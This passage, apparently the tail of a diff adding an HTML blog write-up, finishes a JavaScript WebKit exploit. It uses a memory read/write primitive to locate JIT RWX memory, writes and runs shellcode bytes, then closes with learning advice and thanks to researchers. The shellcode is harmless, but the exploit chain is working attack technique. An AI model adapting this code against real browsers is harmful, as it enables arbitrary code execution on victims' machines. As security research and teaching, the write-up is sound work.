+	print(&quot;  [+] Shellcode function object: 0x&quot; + toHex(functionAddr[0]) + toHex(functionAddr[1]));
+	
+	var executableAddr = memory.read64a(add32a(functionAddr, 24));
+	print(&quot;  [+] Executable instance: 0x&quot; + toHex(executableAddr[0]) + toHex(executableAddr[1]));
+	
+	var jitCodeAddr = memory.read64a(add32a(executableAddr, 24));
+	print(&quot;  [+] JITCode instance: 0x&quot; + toHex(jitCodeAddr[0]) + toHex(jitCodeAddr[1]));
+	
+	var codeAddr = memory.read64a(add32a(jitCodeAddr, 16));
+	print(&quot;  [+] RWX memory: 0x&quot; + toHex(codeAddr[0]) + toHex(codeAddr[1]));
+	
+	print(&quot;  [+] Writing shellcode...&quot;);
+	
+	/*
+		a:
+		jmp a
+		
+		memory.write(codeAddr, [0xeb, 0xfe]);
+	*/
+	
+	
+	/*
+		mov rax, 0xffff000013371337
+		ret
+	*/
+	
+	memory.write(codeAddr, [ 0x48, 0xB8, 0x37, 0x13, 0x37, 0x13, 0x00, 0x00, 0xFF, 0xFF, 0xC3 ]);
+	
+	
+	print(&quot;  [+] Jumping into shellcode...&quot;);
+	var r = bufs[cx][cy + 3]();
+	
+	print(&quot;  [+] Shellcode returned 0x&quot; + toHex(r));
+}
+
+go();
+</code></pre>
+
+<br>
+
+<div class="center">
+	<img src="images/webkit/shellcode.png" />
+</div>
+
+<br>
+
+<p>
+	I would definitely recommend experimenting with this bug to anyone else who is interested in learning about WebKit exploitation since it provides such a nice primitive, the ability to rewrite an object's <code>JSCell</code>, which leads to a large variety of possibilities for exploitation.
+</p>
+
+<br>
+
+<h2>Thanks</h2>
+<ul>
+	<li><a href="https://twitter.com/qwertyoruiopz">qwertyoruiop</a></li>
+	<li><a href="https://twitter.com/5aelo">saelo</a> for <a href="http://www.phrack.org/papers/attacking_javascript_engines.html">his phrack paper</a></li>
+</ul>
+
+			</div>
+		</div>
+	</body>
+</html>
